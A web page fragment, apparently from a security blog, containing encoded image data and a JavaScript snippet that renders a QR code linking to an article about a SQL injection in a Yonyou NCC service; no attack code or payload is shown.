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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-ncc-uapws-service-IBapIOService-getBapTableDatas-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 